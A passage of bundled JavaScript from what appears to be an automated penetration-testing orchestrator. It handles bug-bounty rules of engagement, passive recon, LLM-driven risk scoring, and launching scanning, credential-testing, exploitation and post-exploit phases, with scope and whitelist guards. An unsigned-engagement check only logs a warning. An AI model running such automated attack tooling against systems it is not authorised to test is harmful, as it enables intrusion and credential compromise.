      const parsedScope = typeof roeScope === "string" ? JSON.parse(roeScope) : roeScope;
      const programHandle = parsedScope?.programHandle || parsedScope?.platform_handle || engagement.name?.toLowerCase().replace(/[^a-z0-9]/g, "_").split("_")[0] || "";
      const programRoE = getProgramRoE(programHandle);
      if (programRoE) {
        state.bbRoeConfig = programRoE;
        const excludedTargets = programRoE.testingRestrictions.excludedTargets;
        if (excludedTargets.length > 0) {
          addLog(state, {
            phase: "recon",
            type: "info",
            title: `\u{1F6AB} BB RoE: ${excludedTargets.length} Excluded Targets`,
            detail: `Program "${programHandle}" excludes:
${excludedTargets.map((t) => `  \u2022 ${t}`).join("\n")}
These will be blocked from all active scanning.`
          });
        }
        const briefing = generateOperatorBriefing(programHandle);
        if (briefing) {
          addLog(state, {
            phase: "recon",
            type: "info",
            title: `\u{1F3AF} BB Program RoE Loaded: ${programHandle.toUpperCase()}`,
            detail: [
              `Platform: ${briefing.platform} | Policy: ${briefing.policyUrl}`,
              "",
              "--- CRITICAL RULES ---",
              ...briefing.criticalRules,
              "",
              "--- IDENTIFICATION SETUP ---",
              ...briefing.identificationSetup,
              "",
              "--- EXCLUDED TARGETS ---",
              ...briefing.excludedTargets.map((t) => `  \u2022 ${t}`),
              "",
              "--- DO NOT SUBMIT ---",
              ...briefing.doNotSubmit,
              "",
              "--- CLEANUP REQUIRED ---",
              ...briefing.cleanupActions
            ].join("\n")
          });
        }
        if (Object.keys(programRoE.identification.customHeaders).length > 0) {
          if (!state.dastConfig) {
            state.dastConfig = { enabled: true, crawlDepth: 3, crawlScope: "subdomain", templateCategories: [], timeout: 300, maxRequests: 5e3, rateLimit: programRoE.testingRestrictions.rateLimiting?.maxRequestsPerSecond || 10, headless: true };
          }
          state.dastConfig.customHeaders = { ...state.dastConfig.customHeaders || {}, ...programRoE.identification.customHeaders };
          const opUsername = operatorCtx.h1Username || operatorCtx.name || "ac3-operator";
          for (const [key, val] of Object.entries(state.dastConfig.customHeaders)) {
            if (val === "") state.dastConfig.customHeaders[key] = opUsername;
          }
          addLog(state, {
            phase: "recon",
            type: "info",
            title: "\u{1F194} BB Custom Headers Configured",
            detail: `Injecting identification headers into all scan requests:
${Object.entries(state.dastConfig.customHeaders).map(([k, v]) => `  ${k}: ${v}`).join("\n")}`
          });
        }
        if (programRoE.testingRestrictions.rateLimiting && state.dastConfig) {
          state.dastConfig.rateLimit = programRoE.testingRestrictions.rateLimiting.maxRequestsPerSecond || state.dastConfig.rateLimit;
          addLog(state, {
            phase: "recon",
            type: "info",
            title: "\u23F1\uFE0F BB Rate Limiting Applied",
            detail: `Max ${state.dastConfig.rateLimit} req/s per program RoE requirements`
          });
        }
      } else {
        addLog(state, {
          phase: "recon",
          type: "info",
          title: "\u26A0\uFE0F BB Program RoE: No Config Found",
          detail: `No program-specific RoE config found for "${programHandle}". Engagement will proceed with general H1 Core Ineligible filtering only. Consider importing the program's policy page.`
        });
      }
    } catch (e) {
      console.error("[BBRoE] Failed to load program RoE:", e.message);
      addLog(state, { phase: "recon", type: "info", title: "\u26A0\uFE0F BB RoE Load Warning", detail: `Non-fatal: ${e.message}` });
    }
  }
  for (const domain of domains) {
    if (!state.assets.find((a) => a.hostname === domain)) {
      const sourceCheck = isSourceCodeTarget(domain);
      if (sourceCheck.isSourceCode) {
        state.assets.push({
          hostname: domain,
          type: "source_code",
          ports: [],
          vulns: [],
          pendingVulns: [],
          zapFindings: [],
          exploitAttempts: [],
          confirmedCredentials: [],
          toolResults: [],
          status: "pending",
          sourceCodeUrl: sourceCheck.repoUrl
        });
        addLog(state, {
          phase: "recon",
          type: "info",
          title: "\u{1F4E6} Source Code Asset Detected",
          detail: `${domain} is a source code repository. This asset requires download and local build before testing. Use the Build & Deploy panel in RoE & Scope to provision the test environment.`
        });
      } else {
        state.assets.push({
          hostname: domain,
          type: "unknown",
          ports: [],
          vulns: [],
          pendingVulns: [],
          zapFindings: [],
          exploitAttempts: [],
          confirmedCredentials: [],
          toolResults: [],
          status: "pending"
        });
      }
    }
  }
  for (const ip of ipRanges) {
    if (!state.assets.find((a) => a.hostname === ip || a.ip === ip)) {
      state.assets.push({
        hostname: ip,
        ip,
        type: "unknown",
        ports: [],
        vulns: [],
        pendingVulns: [],
        zapFindings: [],
        exploitAttempts: [],
        confirmedCredentials: [],
        toolResults: [],
        status: "pending"
      });
    }
  }
  for (const domain of domains) {
    try {
      let buildPassiveRecon2 = function(assetAnalysis, reconData) {
        const observations = reconData?.allObservations || [];
        const riskSignals = reconData?.riskSignals || [];
        const assetObs = observations.filter((o) => o.domain === domain || o.name === assetAnalysis?.asset?.hostname);
        const services = [];
        const ipAddresses = [];
        const subdomains = [];
        const technologies = [...assetAnalysis?.asset?.technologies || []];
        const certificates = [];
        const historicalUrls = [];
        const sources = [];
        for (const obs of assetObs) {
          if (obs.source && !sources.includes(obs.source)) sources.push(obs.source);
          if (obs.ip && !ipAddresses.includes(obs.ip)) ipAddresses.push(obs.ip);
          if (obs.name && obs.name !== domain && !subdomains.includes(obs.name)) subdomains.push(obs.name);
          const ev = obs.evidence || {};
          if (ev.port) {
            services.push({
              port: Number(ev.port),
              protocol: ev.transport || "tcp",
              service: ev.service || ev.product || "unknown",
              product: ev.product,
              version: ev.version,
              source: obs.source
            });
          }
          if (ev.ports && Array.isArray(ev.ports)) {
            for (const p of ev.ports) {
              services.push({
                port: typeof p === "number" ? p : Number(p.port || p),
                protocol: p.transport || "tcp",
                service: p.service || "unknown",
                product: p.product,
                version: p.version,
                source: obs.source
              });
            }
          }
          if (ev.technologies && Array.isArray(ev.technologies)) {
            for (const t of ev.technologies) {
              if (typeof t === "string" && !technologies.includes(t)) technologies.push(t);
            }
          }
          if (ev.ssl?.cert) {
            certificates.push({
              subject: ev.ssl.cert.subject || ev.ssl.cert.cn || "",
              issuer: ev.ssl.cert.issuer,
              validFrom: ev.ssl.cert.notBefore,
              validTo: ev.ssl.cert.notAfter
            });
          }
        }
        return {
          subdomains,
          ipAddresses,
          services,
          technologies,
          certificates,
          riskSignals: riskSignals.map((r) => ({
            severity: r.severity || "info",
            type: r.signalType || r.type || "unknown",
            rationale: r.rationale || r.description || r.title || ""
          })),
          wafDetected: void 0,
          cloudProvider: void 0,
          historicalUrls,
          rawObservationCount: assetObs.length,
          sources
        };
      }, postureToVulns2 = function(findings) {
        return (findings || []).map((f, idx) => {
          const hasVersion = !!f.detectedVersion && f.detectedVersion !== "unknown";
          const hasConfirmedVersion = hasVersion && f.versionConfidence === "confirmed";
          const tier = hasConfirmedVersion ? "confirmed" : hasVersion ? "probable" : "potential";
          const evidenceSource = f.source || "passive recon";
          let nucleiHint = void 0;
          const primaryCve = f.cveIds?.[0];
          if (primaryCve || f.category) {
            try {
              const { KNOWN_NUCLEI_CVES, NUCLEI_VULN_CLASS_TAGS } = (init_exploit_selection_intelligence(), __toCommonJS(exploit_selection_intelligence_exports));
              const VULN_CLASS_ALIASES = {
                "command_injection": "cmdi",
                "os_command_injection": "cmdi",
                "path_traversal": "lfi",
                "directory_traversal": "lfi",
                "local_file_inclusion": "lfi",
                "remote_file_inclusion": "rfi",
                "server_side_request_forgery": "ssrf",
                "cross_site_scripting": "xss",
                "sql_injection": "sqli",
                "server_side_template_injection": "ssti",
                "xml_external_entity": "xxe",
                "insecure_deserialization": "deserialization",
                "unrestricted_file_upload": "file_upload",
                "fileupload": "file_upload",
                "authentication_bypass": "auth_bypass",
                "auth-bypass": "auth_bypass"
              };
              if (primaryCve && KNOWN_NUCLEI_CVES) {
                const templatePath = KNOWN_NUCLEI_CVES[primaryCve];
                if (templatePath) {
                  nucleiHint = {
                    templatePath,
                    tags: [],
                    source: "di_pipeline_static_map",
                    confidence: 95,
                    cveId: primaryCve
                  };
                }
              }
              if (!nucleiHint && f.category && NUCLEI_VULN_CLASS_TAGS) {
                const rawClass = f.category.toLowerCase().replace(/[\s-]+/g, "_");
                const normalizedClass = VULN_CLASS_ALIASES[rawClass] || rawClass;
                const tags = NUCLEI_VULN_CLASS_TAGS[normalizedClass];
                if (tags && tags.length > 0) {
                  nucleiHint = {
                    templatePath: null,
                    tags: [...tags],
                    source: "di_pipeline_vuln_class",
                    confidence: 70,
                    cveId: primaryCve || void 0
                  };
                }
              }
              if (!nucleiHint && primaryCve) {
                nucleiHint = {
                  templatePath: null,
                  tags: ["cve"],
                  source: "di_pipeline_generic_cve",
                  confidence: 50,
                  cveId: primaryCve
                };
              }
            } catch (e) {
            }
          }
          const richEvidenceParts = [];
          if (f.evidenceDetail) {
            richEvidenceParts.push(f.evidenceDetail);
          } else {
            richEvidenceParts.push(`Detected via ${evidenceSource}${hasVersion ? ` (version ${f.detectedVersion})` : ""}`);
          }
          if (f.nvdDescription) {
            richEvidenceParts.push(`NVD: ${f.nvdDescription}`);
          }
          if (f.affectedVersions && f.detectedVersion) {
            richEvidenceParts.push(`Affected versions: ${f.affectedVersions}. Detected: ${f.detectedVersion}`);
          }
          if (f.evidenceBasis) {
            const basisLabels = {
              confirmed_cve: "Confirmed CVE match",
              kev_match: "CISA KEV catalog match",
              vuln_feed: "Vulnerability feed match",
              llm_inference: "LLM-inferred risk",
              technology_match: "Technology fingerprint match"
            };
            richEvidenceParts.push(`Basis: ${basisLabels[f.evidenceBasis] || f.evidenceBasis}`);
          }
          const vuln = {
            id: f.cveIds?.[0] || `passive-${domain}-${idx}`,
            severity: f.severity >= 8 ? "critical" : f.severity >= 6 ? "high" : f.severity >= 4 ? "medium" : "low",
            title: f.title || f.category || "Unknown finding",
            cve: f.cveIds?.[0],
            corroborationTier: tier,
            evidenceDetail: richEvidenceParts.join(" | "),
            detectedVersion: f.detectedVersion || null,
            affectedVersions: f.affectedVersions || null,
            // Preserve the full evidence chain from DI scan for report consumption
            evidenceChain: f.evidenceChain || [],
            // Preserve raw evidence fields for report pipeline
            rawEvidence: f.evidenceChain ? f.evidenceChain.join("\n") : void 0,
            description: f.nvdDescription || f.evidenceDetail || void 0,
            source: f.source || evidenceSource,
            tool: f.source || "domain-intel",
            kevListed: f.kevListed || false,
            exploitAvailable: f.exploitAvailable || false,
            cvssScore: f.cvssScore
          };
          if (nucleiHint) {
            vuln.__nucleiHint = nucleiHint;
          }
          return vuln;
        });
      };
      var buildPassiveRecon = buildPassiveRecon2, postureToVulns = postureToVulns2;
      const { isLabDomain } = await import("./passive-U2AX3B2J.js");
      const isLab = isLabDomain(domain);
      const modeLabel = isLab ? "Lab fast-track OSINT (local connectors only)" : "Running passive OSINT scan";
      addLog(state, { phase: "recon", type: "scan_start", title: `Domain Intel: ${domain}`, detail: modeLabel });
      if (isLab) {
        addLog(state, { phase: "recon", type: "info", title: `Lab Domain Detected`, detail: `${domain} matched training lab pattern \u2014 skipping external API connectors (Shodan, SecurityTrails, Censys, etc.) to avoid timeouts` });
      }
      const { runDomainIntelPipeline } = await import("./domainIntel-7NH26KPI.js");
      const result = await runDomainIntelPipeline({
        customerName: engagement.customerName || "Auto",
        primaryDomain: domain,
        additionalDomains: [],
        sector: "technology",
        clientType: "enterprise",
        criticalFunctions: [],
        complianceFlags: []
      });
      const discoveredAssets = result.assets || [];
      const passiveReconData = result.passiveRecon;
      let outOfScopeCount = 0;
      for (const asset of discoveredAssets) {
        const assetHostname = asset.asset?.hostname || asset.hostname || asset.domain || asset.ip;
        if (!assetHostname) continue;
        const existing = state.assets.find((a) => a.hostname === assetHostname);
        const passiveRecon = buildPassiveRecon2(asset, passiveReconData);
        const passiveVulns = postureToVulns2(asset.postureFindings);
        if (existing) {
          existing.ip = asset.asset?.ip || asset.ip || existing.ip;
          existing.type = asset.asset?.assetType === "web_application" ? "web_app" : existing.type;
          existing.passiveRecon = passiveRecon;
          for (const svc of passiveRecon.services) {
            if (!existing.ports.some((p) => p.port === svc.port)) {
              existing.ports.push({
                port: svc.port,
                service: svc.service || "unknown",
                version: svc.version || ""
              });
            }
          }
          enrichPortServices(existing.ports, passiveRecon.services || []);
          for (const v of passiveVulns) {
            const isDupe = existing.pendingVulns.some((pv) => {
              if (v.cve && pv.cve && v.cve === pv.cve) return true;
              if (pv.title === v.title) return true;
              return false;
            });
            if (!isDupe) existing.pendingVulns.push(v);
          }
          existing.status = "discovered";
          state.stats.portsFound = state.assets.reduce((sum, a) => sum + a.ports.length, 0);
        } else if (isInRoeScope(state, assetHostname, asset.asset?.ip || asset.ip)) {
          state.assets.push({
            hostname: assetHostname,
            ip: asset.asset?.ip || asset.ip,
            type: asset.asset?.assetType === "web_application" ? "web_app" : "unknown",
            ports: (() => {
              const ports = passiveRecon.services.map((svc) => ({
                port: svc.port,
                service: svc.service || "unknown",
                version: svc.version || ""
              }));
              enrichPortServices(ports, passiveRecon.services || []);
              return ports;
            })(),
            vulns: [],
            pendingVulns: passiveVulns,
            zapFindings: [],
            exploitAttempts: [],
            confirmedCredentials: [],
            toolResults: [],
            status: "discovered",
            passiveRecon
          });
          state.stats.portsFound = state.assets.reduce((sum, a) => sum + a.ports.length, 0);
        } else {
          outOfScopeCount++;
          addLog(state, {
            phase: "recon",
            type: "warning",
            title: `\u26A0\uFE0F Out-of-Scope Asset: ${assetHostname}`,
            detail: `Discovered ${assetHostname}${asset.ip ? ` (${asset.ip})` : ""} via passive recon but it is NOT in the RoE authorized target list. Skipping active scanning.`
          });
        }
      }
      if (passiveReconData) {
        if (!state.passiveReconResults) state.passiveReconResults = {};
        state.passiveReconResults[domain] = {
          totalObservations: passiveReconData.allObservations?.length || 0,
          riskSignals: passiveReconData.riskSignals?.length || 0,
          connectorStats: passiveReconData.summary?.connectorStats || []
        };
      }
      if (outOfScopeCount > 0) {
        addLog(state, {
          phase: "recon",
          type: "info",
          title: `\u{1F6E1}\uFE0F Scope Guard: ${outOfScopeCount} out-of-scope assets filtered`,
          detail: `${outOfScopeCount} assets discovered via passive recon were excluded from active scanning per RoE.`
        });
      }
      const findingsCount = result.totalFindings || 0;
      const portsFound = state.stats.portsFound;
      const pendingVulnCount = state.assets.reduce((sum, a) => sum + (a.pendingVulns?.length || 0), 0);
      addLog(state, {
        phase: "recon",
        type: "scan_result",
        title: `Recon Complete: ${domain}`,
        detail: `Discovered ${discoveredAssets.length} assets, ${findingsCount} findings, ${portsFound} ports, ${pendingVulnCount} risk signals deferred to scanning phase`,
        data: { domain, assets: discoveredAssets.length, findings: findingsCount, ports: portsFound, pendingVulns: pendingVulnCount }
      });
      emitReconComplete({ scanId: 0, domain, findings: findingsCount });
      try {
        const domainAssets = state.assets.filter((a) => a.hostname === domain || a.hostname.endsWith("." + domain));
        if (domainAssets.length > 0) {
          const { analyzeScan } = await import("./scan-analyst-3GUFBR5J.js");
          const scanData = domainAssets.map((a) => ({
            hostname: a.hostname,
            ip: a.ip,
            type: a.type,
            ports: a.ports,
            technologies: a.passiveRecon?.technologies,
            cloudProvider: a.passiveRecon?.cloudProvider,
            riskSignals: a.passiveRecon?.riskSignals?.map((r) => ({ severity: r.severity, rationale: r.rationale }))
          }));
          const analysis = await analyzeScan({
            hostname: domain,
            scanData: JSON.stringify(scanData, null, 2),
            engagement: {
              engagementType: state.engagementType,
              clientName: domain,
              targetCount: state.assets.length
            },
            engagementId: state.engagementId
          });
          addLog(state, {
            phase: "recon",
            type: "llm_decision",
            title: `\u{1F4CA} Scan Analysis: ${domain}`,
            detail: `Risk: ${analysis.risk_rating || "unknown"} (${analysis.confidence || "low"})
${analysis.executive_summary || "No summary"}

Key findings:
${(analysis.findings || []).slice(0, 5).map((f) => `\u2022 [${f.severity}] ${f.title} \u2014 ${f.evidence_tag || ""}`).join("\n")}

Recommendations:
${(analysis.recommendations || []).slice(0, 3).map((r) => `\u2022 [${r.priority}] ${r.action}`).join("\n")}`,
            data: { scanAnalysis: analysis }
          });
          broadcastOpsUpdate(state.engagementId, { type: "log_update" });
        }
      } catch (saErr) {
        console.warn(`[ScanAnalyst] Failed for ${domain}:`, saErr.message);
      }
      try {
        const domainAssets = state.assets.filter((a) => a.hostname === domain || a.hostname.endsWith("." + domain));
        if (domainAssets.length > 0) {
          const { scoreFullHybrid, buildEngagementContext } = await import("./hybrid-scorer-ME6XLOZH.js");
          for (const asset of domainAssets) {
            if (state._heartbeatRef) state._heartbeatRef.lastActivityAt = Date.now();
            try {
              const riskSignals = (asset.passiveRecon?.riskSignals || []).map((r) => ({
                severity: r.severity || "medium",
                rationale: r.rationale || "Risk signal detected",
                source: r.source || "passive_recon"
              }));
              const hybridResult = await scoreFullHybrid({
                assetId: asset.hostname,
                assetLabel: asset.hostname,
                domain,
                hostname: asset.hostname,
                keywords: asset.passiveRecon?.keywords || [],
                ports: (asset.ports || []).map((p) => ({
                  port: p.port,
                  service: p.service,
                  version: p.version,
                  state: p.state || "open"
                })),
                technologies: asset.passiveRecon?.technologies || [],
                wafDetected: asset.passiveRecon?.wafDetected,
                cloudProvider: asset.passiveRecon?.cloudProvider,
                certificates: asset.passiveRecon?.certificates || [],
                dnsRecords: asset.passiveRecon?.dnsRecords || [],
                httpHeaders: asset.passiveRecon?.httpHeaders || {},
                riskSignals,
                engagementContext: state.engagementContext || buildEngagementContext({
                  engagementType: state.engagementType || "pentest",
                  targetCount: state.assets?.length || 1,
                  domains: [domain]
                })
              });
              asset.hybridScore = hybridResult.finalScore;
              asset.hybridTier = hybridResult.finalTier;
              const adjustmentSummary = Object.entries(hybridResult.llmEnhanced.adjustments || {}).filter(([_, v]) => v.delta !== 0).map(([k, v]) => `${k}: ${v.delta > 0 ? "+" : ""}${v.delta} (${v.justification})`).slice(0, 5);
              addLog(state, {
                phase: "recon",
                type: "llm_decision",
                title: `\u{1F3AF} Hybrid Risk Score: ${asset.hostname}`,
                detail: `Score: ${hybridResult.finalScore}/10 (${hybridResult.finalTier})
Baseline: ${hybridResult.baseline.scores.hybrid}/10 (${hybridResult.baseline.scores.priorityTier})
Confidence: ${hybridResult.llmEnhanced.confidence}

Risk Narrative: ${hybridResult.llmEnhanced.overallRiskNarrative}

${adjustmentSummary.length > 0 ? "LLM Adjustments:\n" + adjustmentSummary.map((a) => "\u2022 " + a).join("\n") : "No LLM adjustments applied"}`,
                data: { hybridScoring: hybridResult }
              });
              broadcastOpsUpdate(state.engagementId, { type: "log_update" });
            } catch (assetHsErr) {
              console.warn(`[HybridScorer] Failed for asset ${asset.hostname}:`, assetHsErr.message);
            }
          }
        }
      } catch (hsErr) {
        console.warn(`[HybridScorer] Failed for ${domain}:`, hsErr.message);
      }
    } catch (e) {
      addLog(state, { phase: "recon", type: "error", title: `Recon Failed: ${domain}`, detail: e.message });
    }
  }
  state.progress = 15;
  addLog(state, { phase: "recon", type: "phase_complete", title: "\u2705 Phase 1 Complete", detail: `${state.assets.length} assets in scope` });
  for (const asset of state.assets) {
    broadcastReconFinding(state.engagementId, {
      target: asset.hostname || asset.ip,
      host: asset.hostname,
      ip: asset.ip,
      tool: "passive_recon"
    });
    for (const p of asset.ports || []) {
      broadcastReconFinding(state.engagementId, {
        target: asset.hostname || asset.ip,
        port: typeof p.port === "number" ? p.port : parseInt(String(p.port)) || void 0,
        service: p.service || void 0,
        protocol: "tcp",
        tool: "passive_recon"
      });
    }
    for (const v of asset.vulns || []) {
      broadcastReconFinding(state.engagementId, {
        target: asset.hostname || asset.ip,
        vulnerability: v.title || v.id,
        cve: v.cve,
        severity: v.severity || "info",
        tool: "passive_recon"
      });
    }
    if (asset.passiveRecon?.subdomains) {
      for (const sub of asset.passiveRecon.subdomains) {
        broadcastReconFinding(state.engagementId, {
          target: asset.hostname || asset.ip,
          subdomain: typeof sub === "string" ? sub : sub.hostname,
          tool: "passive_recon"
        });
      }
    }
    if (asset.passiveRecon?.technologies) {
      for (const tech of asset.passiveRecon.technologies) {
        broadcastReconFinding(state.engagementId, {
          target: asset.hostname || asset.ip,
          technology: typeof tech === "string" ? tech : tech.name,
          tool: "passive_recon"
        });
      }
    }
  }
}
async function executeEnumeration(state, engagement, operatorCtx) {
  const { executeEnumeration: runEnumerationPhase } = await import("./engagement-phase-enumeration-LQPI3TG7.js");
  return runEnumerationPhase(state, engagement, operatorCtx);
}
async function executeVulnDetection(state, engagement, operatorCtx) {
  state.phase = "vuln_detection";
  state.currentAction = "Running vulnerability detection...";
  const scanServerHost = process.env.SCAN_SERVER_HOST || "";
  addLog(state, { phase: "vuln_detection", type: "info", title: "\u{1F6E1}\uFE0F Phase 6: Vulnerability Scanning", detail: "Running nuclei scans and ZAP web app scans" });
  broadcastOpsUpdate(state.engagementId, { type: "phase_change", phase: "vuln_detection" });
  const phase6Ctx = {
    state,
    engagement,
    operatorCtx,
    scanServerHost,
    // Core helpers
    addLog,
    broadcastOpsUpdate,
    broadcastReconFinding,
    pushVulnDeduped,
    persistOpsStateDebounced,
    persistScanResult,
    executeToolViaQueue,
    acquireScanSlot,
    getScanConcurrencyMetrics,
    genId,
    breathe,
    invokeLLM,
    throttledLLMCall,
    // Scope & targeting
    isInRoeScope,
    getEffectiveTarget,
    fmtTarget,
    // Approval & decisions
    requestApproval,
    llmDecide,
    captureDecision,
    scoreEngagementThreatAttribution,
    // Tool output parsing
    parseToolOutput,
    // Abort & ScanForge
    getEngagementAbortSignal,
    executeScanForgePhase
  };
  const { executeVulnPrep } = await import("./vuln-prep-RIXI57AN.js");
  const vulnPrepCtx = {
    state,
    engagement,
    operatorCtx,
    scanServerHost,
    helpers: {
      addLog,
      broadcastOpsUpdate,
      pushVulnDeduped,
      persistOpsStateDebounced,
      persistScanResult,
      executeToolViaQueue,
      acquireScanSlot,
      getScanConcurrencyMetrics,
      genId,
      breathe,
      invokeLLM,
      throttledLLMCall
    }
  };
  const vulnPrepResult = await executeVulnPrep(vulnPrepCtx);
  const burpAppLogin = vulnPrepResult.burpAppLogin;
  const initialPipelineResult = vulnPrepResult.initialPipelineResult;
  phase6Ctx.burpAppLogin = burpAppLogin;
  phase6Ctx.initialPipelineResult = initialPipelineResult;
  const { executeNucleiScanning } = await import("./nuclei-scanner-3W52ZIMD.js");
  const nucleiResult = await executeNucleiScanning(phase6Ctx);
  addLog(state, { phase: "vuln_detection", type: "phase_complete", title: "Nuclei Complete", detail: `${nucleiResult.findingsCount} findings, ${nucleiResult.errorsCount} errors` });
  const { executeZapScanning } = await import("./zap-scanner-JGIBXV7D.js");
  const zapResult = await executeZapScanning(phase6Ctx);
  addLog(state, { phase: "vuln_detection", type: "phase_complete", title: "ZAP Complete", detail: `${zapResult.findingsCount} findings across ${zapResult.webAppsScanned} targets` });
  const { executeInjectionScanning } = await import("./injection-scanner-EEKLYZZS.js");
  const injectionResult = await executeInjectionScanning(phase6Ctx);
  addLog(state, { phase: "vuln_detection", type: "phase_complete", title: "Injection Scanning Complete", detail: `${injectionResult.totalFindings} findings` });
  const { executeCredentialTesting } = await import("./credential-tester-ZFB357DQ.js");
  const credResult = await executeCredentialTesting(phase6Ctx);
  addLog(state, { phase: "vuln_detection", type: "phase_complete", title: "Credential Testing Complete", detail: `${credResult.credentialsConfirmed} credentials confirmed` });
  const { executeVulnCorrelation } = await import("./vuln-correlation-RPSFNLCX.js");
  const correlationResult = await executeVulnCorrelation(phase6Ctx);
  addLog(state, { phase: "vuln_detection", type: "phase_complete", title: "Vuln Correlation Complete", detail: `${correlationResult.deduplicatedCount} unique findings after dedup` });
  addLog(state, { phase: "vuln_detection", type: "phase_complete", title: "\u2705 Phase 6 Complete", detail: `${state.stats.vulnsFound} vulns found (post-dedup), ${state.stats.zapScansRun} ZAP scans, ${state.stats.wafDetections} WAFs detected` });
  broadcastOpsUpdate(state.engagementId, {
    type: "phase_complete",
    title: "\u2705 Phase 6 Complete",
    detail: `${state.stats.vulnsFound} vulns found (post-dedup), ${state.stats.zapScansRun} ZAP scans, ${state.stats.wafDetections} WAFs detected`
  });
  broadcastOpsUpdate(state.engagementId, { type: "stats_update", stats: { ...state.stats } });
}
async function executeExploitation(state, engagement, operatorCtx) {
  const { executeExploitation: runExploitPhase } = await import("./engagement-phase-exploitation-RLZ3QRIX.js");
  return runExploitPhase(state, engagement, operatorCtx);
}
async function executePostExploit(state, engagement, operatorCtx) {
  const { executePostExploit: runPostExploitPhase } = await import("./engagement-phase-post-exploit-3O65ULXB.js");
  return runPostExploitPhase(state, engagement, operatorCtx);
}
async function executeEngagement(engagementId, operatorCtx, options) {
  let startPhase = options?.startPhase || "recon";
  const runningCount = [...opsStates.values()].filter((s) => s.isRunning && s.phase !== "completed" && s.phase !== "error").length;
  if (runningCount >= MAX_CONCURRENT_ENGAGEMENTS) {
    const errState = opsStates.get(engagementId) || initOpsState(engagementId, "pentest");
    addLog(errState, {
      phase: "idle",
      type: "error",
      title: `\u26D4 Capacity Limit Reached (${MAX_CONCURRENT_ENGAGEMENTS} concurrent)`,
      detail: `Cannot start engagement \u2014 ${runningCount} engagements are already running. Wait for one to complete or stop an active engagement.`
    });
    errState.phase = "error";
    errState.error = `Capacity limit: ${runningCount}/${MAX_CONCURRENT_ENGAGEMENTS} concurrent engagements`;
    return;
  }
  try {
    const { claimEngagement } = await import("./engagement-claim-lock-3DJGBX7I.js");
    const claim = await claimEngagement(engagementId, { force: true });
    if (!claim.claimed) {
      const errState = opsStates.get(engagementId) || initOpsState(engagementId, "pentest");
      addLog(errState, {
        phase: "idle",
        type: "error",
        title: `\u26D4 Engagement Owned by Another Server`,
        detail: `Cannot start: another server instance (${claim.currentOwner}) owns this engagement. ${claim.reason}`
      });
      errState.phase = "error";
      errState.error = `Claim denied: owned by ${claim.currentOwner}`;
      return;
    }
  } catch (e) {
    console.warn(`[ExecuteEngagement] Claim lock check failed (proceeding): ${e.message}`);
  }
  let state = opsStates.get(engagementId);
  if (options?.resume && !state) {
    try {
      const recovered = await getOpsStateWithRecovery(engagementId);
      if (recovered && recovered.phase !== "completed" && recovered.phase !== "error" && recovered.phase !== "idle") {
        state = recovered;
        const phaseOrder = ["recon", "passive_discovery", "scoping", "test_plan", "test_plan_approval", "enumeration", "vuln_detection", "social_engineering", "exploitation", "post_exploit"];
        if (options?.startPhase) {
          startPhase = options.startPhase;
        } else {
          startPhase = recovered.phase;
        }
        const recoveredPhaseLabel = recovered.phase.replace(/_/g, " ");
        const startPhaseLabel = startPhase.replace(/_/g, " ");
        addLog(state, {
          phase: state.phase,
          type: "info",
          title: "\u{1F504} Resumed from Checkpoint",
          detail: `State recovered from DB snapshot.
Last completed phase: ${recoveredPhaseLabel}
Continuing from: ${startPhaseLabel}
Preserved: ${state.assets.length} assets, ${state.stats.vulnsFound} vulns, ${state.stats.portsFound} ports, ${state.log.length} log entries`
        });
        console.log(`[OpsState] Resuming engagement #${engagementId}: ${recoveredPhaseLabel} \u2192 ${startPhaseLabel} (${state.assets.length} assets, ${state.stats.vulnsFound} vulns)`);
      }
    } catch (e) {
      console.error(`[OpsState] Resume failed for #${engagementId}:`, e.message);
    }
  }
  if (!state) {
    state = initOpsState(engagementId, "pentest");
  }
  let engagement;
  try {
    const db = await import("./db-D773P4Y2.js");
    engagement = await db.getEngagementById(engagementId);
    if (!engagement) throw new Error("Engagement not found");
    state.engagementType = engagement.engagementType || "pentest";
  } catch (e) {
    state.error = e.message;
    state.phase = "error";
    return;
  }
  if (state.trainingLabMode === void 0) {
    const domain = engagement.targetDomain || "";
    if (domain.includes("aceofcloud.io") || domain.includes("aceofcloud.com") || engagement.labName) {
      state.trainingLabMode = true;
      console.log(`[ExecuteEngagement] Training lab mode re-detected for #${engagementId} (domain: ${domain})`);
    }
  }
  console.log(`[ExecuteEngagement] #${engagementId} loaded from DB: roeStatus=${JSON.stringify(engagement.roeStatus)}, trainingLabMode=${state.trainingLabMode}, startPhase=${startPhase}, resume=${options?.resume}`);
  if (engagement.roeStatus !== "signed" && engagement.roeStatus !== "pending" && !state.trainingLabMode) {
    addLog(state, {
      phase: "idle",
      type: "error",
      title: "\u26A0\uFE0F RoE Not Signed",
      detail: "Rules of Engagement must be signed before active operations can begin. Only passive recon is allowed."
    });
  }
  state.isRunning = true;
  if (!state.startedAt) state.startedAt = Date.now();
  state.phase = startPhase;
  if (options?.scanProfile) state.scanProfile = options.scanProfile;
  const domainValidation = validateEngagementTargets(engagement.targetDomain, engagement.targetIpRange);
  let domainWhitelistOverride = false;
  if (!domainValidation.allWhitelisted && !state.trainingLabMode) {
    try {
      const mysql = await import("mysql2/promise");
      const tmpConn = await mysql.createConnection(process.env.DATABASE_URL);
      const [rows] = await tmpConn.query("SELECT active_scan_override FROM engagements WHERE id = ?", [engagementId]);
      domainWhitelistOverride = !!rows?.[0]?.active_scan_override;
      await tmpConn.end();
    } catch {
    }
    if (!domainWhitelistOverride) {
      addLog(state, {
        phase: state.phase,
        type: "info",
        title: "\u{1F6E1}\uFE0F Domain Whitelist: Non-Approved Targets Detected",
        detail: `${domainValidation.nonWhitelistedCount} target(s) are NOT on the approved test lab whitelist: ${domainValidation.nonWhitelistedTargets.join(", ")}. Safety level will be capped at passive_only. Active scanning, exploitation, and C2 are BLOCKED. An admin can enable "Active Scan Override" on this engagement to authorize active testing.`
      });
      console.warn(`[Orchestrator] Domain whitelist enforcement: capping engagement #${engagementId} to passive_only (non-whitelisted: ${domainValidation.nonWhitelistedTargets.join(", ")})`);
    } else {
      addLog(state, {
        phase: state.phase,
        type: "info",
        title: "\u26A0\uFE0F Domain Whitelist: Admin Override Active",
        detail: `${domainValidation.nonWhitelistedCount} target(s) are not on the whitelist (${domainValidation.nonWhitelistedTargets.join(", ")}), but an admin has enabled Active Scan Override. Full pipeline authorized per admin authorization.`
      });
    }
  } else if (domainValidation.allWhitelisted) {
    addLog(state, {
      phase: state.phase,
      type: "info",
      title: "\u2705 Domain Whitelist: All Targets Approved",
      detail: `All ${domainValidation.totalTargets} target(s) are on the approved test lab whitelist. Full pipeline access authorized.`
    });
  }
  const scanModeToSafety = {
